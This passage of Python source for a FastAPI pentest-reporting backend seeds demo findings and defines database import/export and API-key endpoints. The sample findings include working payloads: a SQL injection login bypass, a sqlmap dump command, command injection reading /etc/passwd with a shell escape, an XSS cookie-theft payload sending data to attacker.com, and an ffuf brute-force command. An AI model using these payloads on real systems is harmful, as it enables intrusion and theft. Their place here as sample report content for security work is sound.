            "description": "Se detectó una vulnerabilidad de Inyección SQL en el parámetro `username` del formulario de autenticación. El atacante puede manipular la consulta SQL para bypassear la autenticación, extraer toda la base de datos de usuarios (incluyendo contraseñas hasheadas) y, dependiendo de los permisos del usuario de base de datos, ejecutar comandos del sistema operativo mediante `xp_cmdshell`.",
            "poc": "1. Acceder al panel de login en /admin/login\n2. Introducir el siguiente payload en el campo usuario:\n   ' OR '1'='1' --\n3. Observar que el login se completa sin contraseña\n4. Para extracción de datos con sqlmap:\n   sqlmap -u 'https://shop.acmeshop.com/login' --data='user=test&pass=test' -p user --dbs --batch\n5. Resultado: dump completo de la base de datos 'acmeshop_prod'",
            "impact": "Un atacante podría obtener acceso completo a la plataforma de administración, extraer todas las credenciales de usuarios (más de 45.000 registros), modificar datos de pedidos y precios, y potencialmente comprometer el servidor subyacente. El impacto en el negocio es crítico, con riesgo de multas por violación del GDPR y pérdida de confianza de clientes.",
            "remediation": "Reemplazar todas las consultas dinámicas por prepared statements con parámetros parametrizados. Ejemplo en PHP:\n\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');\n$stmt->execute([$username, $password_hash]);\n\nAdicional: implementar WAF, limitar permisos del usuario de BD, activar logging de consultas SQL.",
            "images": [img("panellogin.png"), img("sqlmap.png"), img("sqlmap1.png")],
            "fields_visibility": {"owasp": True, "risk": True, "compliance": True, "retest": True},
        },
        {
            "title": "Command Injection y escalada de privilegios (GTFOBins)",
            "severity": "crit",
            "cvss": "9.0",
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
            "cve": "N/A",
            "cwe": "CWE-78",
            "owasp": "A03:2021 – Injection",
            "status": "open",
            "likelihood": "high",
            "impact_rating": "high",
            "affected_assets": "GET https://shop.acmeshop.com/admin/file-manager/preview\nparam: file",
            "compliance": ["PCI-DSS 6.5.1", "MITRE ATT&CK T1059"],
            "reference": "https://gtfobins.github.io/",
            "description": "El módulo de gestión de archivos del panel de administración permite ejecutar comandos del sistema operativo sin sanitizar el input. A través del parámetro `file` del endpoint `/admin/preview`, un atacante autenticado puede inyectar comandos arbitrarios. Combinado con la vulnerabilidad de SQLi anterior, el ataque no requiere credenciales previas.",
            "poc": "1. Autenticarse usando el bypass SQLi de la vulnerabilidad anterior\n2. Navegar a /admin/file-manager/preview\n3. Inyectar en el parámetro file:\n   ; id; whoami; cat /etc/passwd\n4. Escalar privilegios usando python3 desde GTFOBins:\n   python3 -c 'import os; os.system(\"/bin/bash\")'\n5. Resultado: shell interactiva como www-data con posibilidad de escalar a root",
            "impact": "Control total del servidor web. Posibilidad de instalar backdoors persistentes, exfiltrar todos los datos almacenados, pivotar a otros sistemas de la red interna y comprometer la infraestructura completa de la organización.",
            "remediation": "Nunca pasar input de usuario directamente a funciones del sistema. Usar listas blancas de comandos permitidos. Implementar sandboxing (contenedores sin privilegios). Aplicar el principio de mínimo privilegio al usuario del servidor web (www-data sin shell).",
            "images": [img("gtfobins.png")],
            "fields_visibility": {"owasp": True, "risk": True, "compliance": True, "retest": True},
        },
        {
            "title": "Broken Access Control — IDOR en perfiles de usuario",
            "severity": "high",
            "cvss": "8.6",
            "cve": "N/A",
            "cwe": "CWE-284",
            "owasp": "A01:2021 – Broken Access Control",
            "likelihood": "high",
            "impact_rating": "high",
            "reference": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            "description": "El endpoint `/api/users/{id}/profile` no verifica que el usuario autenticado sea el propietario del recurso solicitado. Cualquier usuario autenticado puede acceder y modificar perfiles de otros usuarios simplemente modificando el parámetro `id` en la URL. Se descubrieron 45.231 perfiles accesibles de esta forma.",
            "poc": "1. Autenticarse con cuenta propia (user_id: 1234)\n2. Acceder a /api/users/1234/profile — respuesta correcta del propio perfil\n3. Modificar el ID en la URL: /api/users/1/profile\n4. Observar que se devuelve el perfil del usuario administrador\n5. Iterar con Burp Intruder sobre todos los IDs para volcar perfiles\n   GET /api/users/§1§/profile HTTP/1.1",
            "impact": "Exposición de información personal identificable (PII) de todos los usuarios: nombre, email, dirección, teléfono e historial de compras. Violación directa del GDPR con posibilidad de sanciones de hasta el 4% de la facturación anual global.",
            "remediation": "Implementar verificación de autorización a nivel de objeto en cada endpoint. El servidor debe validar que el user_id del token JWT coincide con el recurso solicitado:\n\nif current_user.id != requested_user_id:\n    raise HTTPException(403, 'Forbidden')\n\nUsar UUIDs en lugar de IDs secuenciales para dificultar la enumeración.",
            "images": [img("idor.png"), img("burpsuite.png")],
            "fields_visibility": {"owasp": True, "risk": True, "compliance": True, "retest": True},
        },
        {
            "title": "Cross-Site Scripting (XSS) Reflejado en buscador",
            "severity": "high",
            "cvss": "7.4",
            "cve": "N/A",
            "cwe": "CWE-79",
            "owasp": "A03:2021 – Injection",
            "likelihood": "med",
            "impact_rating": "high",
            "reference": "https://owasp.org/www-community/attacks/xss/",
            "description": "El parámetro `q` del buscador de productos refleja el input del usuario directamente en el HTML de la respuesta sin sanitización. Un atacante puede construir URLs maliciosas que al ser visitadas por un usuario ejecutan JavaScript arbitrario en su navegador, pudiendo robar cookies de sesión, redirigir a páginas de phishing o modificar el DOM.",
            "poc": "1. Navegar a la URL:\n   https://shop.acmeshop.com/search?q=<script>alert(document.cookie)</script>\n2. Observar la ejecución del alert con las cookies de sesión\n3. Payload de robo de cookies:\n   ?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n4. Enviar la URL crafteada a una víctima mediante ingeniería social",
            "impact": "Robo de sesiones de usuario, redirección a sitios de phishing, keylogging en el navegador de la víctima. En combinación con el token de administrador, podría escalar a compromiso total de la plataforma.",
            "remediation": "Aplicar encoding de output en todos los parámetros reflejados. Implementar Content Security Policy (CSP) estricta:\n\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';\n\nUsar funciones de escape como htmlspecialchars() en PHP o textContent en lugar de innerHTML en JavaScript.",
            "images": [img("presentacionweb.png"), img("burpsuite.png")],
            "fields_visibility": {"owasp": True, "risk": True, "compliance": True, "retest": True},
        },
        {
            "title": "Fuerza bruta al panel de administración sin bloqueo",
            "severity": "high",
            "cvss": "7.5",
            "cve": "N/A",
            "cwe": "CWE-307",
            "owasp": "A07:2021 – Identification and Authentication Failures",
            "likelihood": "med",
            "impact_rating": "high",
            "reference": "https://owasp.org/www-project-web-security-testing-guide/",
            "description": "El panel de administración en `/admin/login` no implementa ningún mecanismo de protección contra ataques de fuerza bruta: no hay límite de intentos fallidos, no existe CAPTCHA, no hay bloqueo temporal de cuentas ni alertas por intentos fallidos. Se realizó un ataque de diccionario con éxito en menos de 30 minutos.",
            "poc": "1. Identificar el panel de administración mediante fuzzing:\n   ffuf -u https://shop.acmeshop.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\n2. Resultado: /admin/login encontrado (200 OK)\n3. Ataque de fuerza bruta con ffuf:\n   ffuf -u https://shop.acmeshop.com/admin/login -X POST \\\n        -d 'user=admin&pass=FUZZ' -w rockyou.txt \\\n        -fc 401 -t 50\n4. Contraseña encontrada: 'admin123' en 8 minutos",
            "impact": "Acceso no autorizado al panel de administración con control total sobre usuarios, pedidos, configuración y datos sensibles. La combinación con otras vulnerabilidades permite compromiso total del sistema.",
            "remediation": "Implementar rate limiting (máximo 5 intentos por IP en 15 minutos). Añadir autenticación multifactor (MFA/TOTP). Configurar alertas por email ante intentos fallidos repetidos. Considerar CAPTCHA en el formulario de login de administración.",
            "images": [img("fuzzing-web.png"), img("fuzzing2.png")],
            "fields_visibility": {"owasp": True, "risk": True, "compliance": True, "retest": True},
        },
        {
            "title": "Cabeceras de seguridad HTTP ausentes",
            "severity": "low",
            "cvss": "3.7",
            "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
            "cve": "N/A",
            "cwe": "CWE-693",
            "owasp": "A05:2021 – Security Misconfiguration",
            "status": "remediated",
            "likelihood": "low",
            "impact_rating": "low",
            "retest_notes": "Re-test (v1.0): el cliente añadió todas las cabeceras recomendadas en la configuración de nginx. Verificado con securityheaders.com (calificación A). Hallazgo cerrado.",
            "compliance": ["ISO 27001 A.14.1"],
            "reference": "https://securityheaders.com/",
            "description": "El servidor web no incluye las cabeceras de seguridad HTTP recomendadas. Analizando las respuestas HTTP se observa la ausencia de: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy y Permissions-Policy. Esto facilita ataques de clickjacking, MIME sniffing y fuga de información de referrer.",
            "poc": "Verificación con curl:\n  curl -I https://shop.acmeshop.com/\n\nCabeceras ausentes observadas:\n  ✗ Content-Security-Policy: no presente\n  ✗ X-Frame-Options: no presente\n  ✗ X-Content-Type-Options: no presente\n  ✗ Referrer-Policy: no presente\n  ✗ Permissions-Policy: no presente\n\nVerificación online: https://securityheaders.com → Resultado: F",
            "impact": "Riesgo de ataques de clickjacking embebiendo la web en iframes maliciosos. MIME sniffing puede llevar a ejecución de scripts en archivos subidos. Fuga de URLs de referrer con información sensible.",
            "remediation": "Añadir las siguientes cabeceras en la configuración del servidor web (nginx):\n\nadd_header Content-Security-Policy \"default-src 'self'\" always;\nadd_header X-Frame-Options \"SAMEORIGIN\" always;\nadd_header X-Content-Type-Options \"nosniff\" always;\nadd_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\nadd_header Permissions-Policy \"camera=(), microphone=(), geolocation=()\" always;",
            "images": [],
            "fields_visibility": {"owasp": True, "risk": True, "compliance": True, "retest": True},
        },
    ]

    order = 1
    for f in findings:
        finding = models.Finding(
            report_id=rid,
            title=f["title"],
            severity=f["severity"],
            cvss=f["cvss"],
            cvss_vector=f.get("cvss_vector", ""),
            cve=f["cve"],
            cwe=f["cwe"],
            reference=f["reference"],
            references=f.get("references", []),
            description=f["description"],
            poc=f["poc"],
            impact=f["impact"],
            remediation=f["remediation"],
            status=f.get("status", "open"),
            affected_assets=f.get("affected_assets", ""),
            likelihood=f.get("likelihood", ""),
            impact_rating=f.get("impact_rating", ""),
            owasp=f.get("owasp", ""),
            compliance=f.get("compliance", []),
            retest_notes=f.get("retest_notes", ""),
            fields_visibility=f.get("fields_visibility", {}),
            images=f["images"],
            order_index=order,
        )
        db.add(finding)
        order += 1

    db.commit()
    return {"report_id": rid, "findings_count": len(findings)}


@app.get("/api/database/export")
def export_database(_user: models.User = Depends(auth.require_auth)):
    if not os.path.exists(db_path):
        raise HTTPException(status_code=404, detail="Base de datos no encontrada")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"pwnly_backup_{timestamp}.db"
    
    return FileResponse(
        db_path,
        media_type="application/x-sqlite3",
        filename=filename
    )


@app.post("/api/database/import")
def import_database(file: UploadFile = File(...), db: Session = Depends(get_db), _user: models.User = Depends(auth.require_auth)):
    if not file.filename.endswith('.db'):
        raise HTTPException(status_code=400, detail="El archivo debe tener extensión .db")
    
    backup_path = None
    if os.path.exists(db_path):
        backup_path = f"{db_path}.backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        shutil.copy2(db_path, backup_path)
    
    try:
        # mkstemp crea el fichero de forma atómica con permisos 0600 y nombre no
        # predecible (mktemp estaba deprecado por race condition / nombre adivinable).
        _tmp_fd, temp_path = tempfile.mkstemp(suffix=".db")
        os.close(_tmp_fd)
        with open(temp_path, "wb") as buffer:
            shutil.copyfileobj(file.file, buffer)
        
        import sqlite3
        import json
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [row[0] for row in cursor.fetchall()]

            required_tables = {'reports', 'findings'}
            if not required_tables.issubset(set(tables)):
                conn.close()
                raise HTTPException(
                    status_code=400,
                    detail=f"La base de datos no tiene las tablas requeridas. Tablas encontradas: {tables}"
                )

            # El .db importado no pasa por los schemas, así que saneamos aquí
            # client_logo/images para no almacenar URLs que provoquen SSRF o XSS.
            def _sanitize_json_column(table, column, keep_slots):
                cursor.execute(f"SELECT id, {column} FROM {table}")
                for row_id, raw in cursor.fetchall():
                    try:
                        values = json.loads(raw) if raw else []
                    except (TypeError, ValueError):
                        values = []
                    if not isinstance(values, list):
                        values = []
                    cleaned = schemas.sanitize_image_list(values, keep_slots=keep_slots)
                    cursor.execute(
                        f"UPDATE {table} SET {column} = ? WHERE id = ?",
                        (json.dumps(cleaned), row_id),
                    )

            _sanitize_json_column("reports", "client_logo", keep_slots=True)
            _sanitize_json_column("findings", "images", keep_slots=False)

            # Saneamos la plantilla HTML y el CSS de temas importados: se
            # renderizan/inyectan en el navegador, así que un .db malicioso
            # podría colar <script>/CSS peligroso.
            if "themes" in tables:
                theme_cols = [r[1] for r in cursor.execute("PRAGMA table_info(themes)").fetchall()]
                has_html = "html_template" in theme_cols
                has_css = "custom_css" in theme_cols
                if has_html or has_css:
                    cols = ["id"] + (["html_template"] if has_html else []) + (["custom_css"] if has_css else [])
                    sel = f"SELECT {', '.join(cols)} FROM themes"
                    for row in cursor.execute(sel).fetchall():
                        row_id = row[0]
                        i = 1
                        if has_html:
                            cursor.execute("UPDATE themes SET html_template = ? WHERE id = ?",
                                           (schemas.sanitize_html_template(row[i] or ""), row_id))
                            i += 1
                        if has_css:
                            cursor.execute("UPDATE themes SET custom_css = ? WHERE id = ?",
                                           (schemas.sanitize_css_source(row[i] or ""), row_id))

            # Normalizamos la tabla 'users' importada: descartamos cuentas cuyo
            # hash de contraseña no tenga el formato PBKDF2 esperado. Un .db
            # manipulado podría traer credenciales con hashes arbitrarios; así
            # sólo sobreviven cuentas verificables por el flujo normal de login.
            if "users" in tables:
                user_cols = [r[1] for r in cursor.execute("PRAGMA table_info(users)").fetchall()]
                if "password_hash" in user_cols:
                    for uid, phash in cursor.execute("SELECT id, password_hash FROM users").fetchall():
                        if not auth.is_valid_password_hash(phash):
                            cursor.execute("DELETE FROM users WHERE id = ?", (uid,))

            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            print(f"[Pwnly] Import: archivo SQLite inválido: {e}", file=sys.stderr)
            raise HTTPException(status_code=400, detail="El archivo no es una base de datos SQLite válida")
        
        db.close()

        shutil.copy2(temp_path, db_path)

        os.remove(temp_path)

        # El .db importado puede ser de una versión anterior: aseguramos que
        # tenga todas las tablas/columnas nuevas (themes, finding_templates, …).
        try:
            models.Base.metadata.create_all(bind=engine)
            from migrations import run_migrations as _run_migrations
            _run_migrations(engine)
        except Exception as _e:
            print(f"⚠️  Post-import schema sync: {_e}")

        return JSONResponse(
            content={
                "message": "Base de datos importada correctamente",
                "filename": file.filename,
                "backup_created": backup_path is not None,
                "backup_path": backup_path
            }
        )
        
    except HTTPException:
        # Restaurar backup si existe
        if backup_path and os.path.exists(backup_path):
            shutil.copy2(backup_path, db_path)
            os.remove(backup_path)
        raise
    except Exception as e:
        # Restaurar backup si existe
        if backup_path and os.path.exists(backup_path):
            shutil.copy2(backup_path, db_path)
            os.remove(backup_path)
        # El detalle (ruta, error SQL...) sólo va al log; al cliente, mensaje genérico.
        print(f"[Pwnly] Error al importar la base de datos: {e}", file=sys.stderr)
        raise HTTPException(status_code=500, detail="No se pudo importar la base de datos")


# --------------------------------------------------------------------------- #
# API Keys (acceso programático a la API REST)
# --------------------------------------------------------------------------- #
@app.get("/api/api-keys", response_model=List[schemas.ApiKeyInfo])
def list_api_keys(
    db: Session = Depends(get_db),
    user: models.User = Depends(auth.require_auth),
):
    return (
        db.query(models.ApiKey)
        .filter(models.ApiKey.user_id == user.id)
        .order_by(models.ApiKey.created_at.desc())
        .all()
    )


@app.post("/api/api-keys", response_model=schemas.ApiKeyCreated)
def create_api_key(
    payload: schemas.ApiKeyCreate,
    db: Session = Depends(get_db),
    user: models.User = Depends(auth.require_auth),
):
    label = (payload.label or "").strip() or "API Key"
    # Generamos el secreto: "pwn_" + 43 chars base64url (32 bytes de entropía)
    raw_key = f"{auth.API_KEY_PREFIX}{secrets.token_urlsafe(32)}"
    key_hash = hashlib.sha256(raw_key.encode()).hexdigest()
    prefix = raw_key[:12]  # "pwn_XXXXXXXX"

    api_key = models.ApiKey(
        user_id=user.id,
        label=label,
        key_hash=key_hash,
        prefix=prefix,
    )
    db.add(api_key)
    db.commit()
    db.refresh(api_key)

    return schemas.ApiKeyCreated(
        id=api_key.id,
        label=api_key.label,
        prefix=api_key.prefix,
        created_at=api_key.created_at,
        last_used_at=api_key.last_used_at,
        key=raw_key,
    )


@app.delete("/api/api-keys/{key_id}")
def delete_api_key(
    key_id: int,
    db: Session = Depends(get_db),
    user: models.User = Depends(auth.require_auth),
):
    api_key = (
        db.query(models.ApiKey)
        .filter(models.ApiKey.id == key_id, models.ApiKey.user_id == user.id)
        .first()
    )
    if not api_key:
        raise HTTPException(status_code=404, detail="API key no encontrada")
    db.delete(api_key)
    db.commit()
    return {"message": "API key revocada correctamente"}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)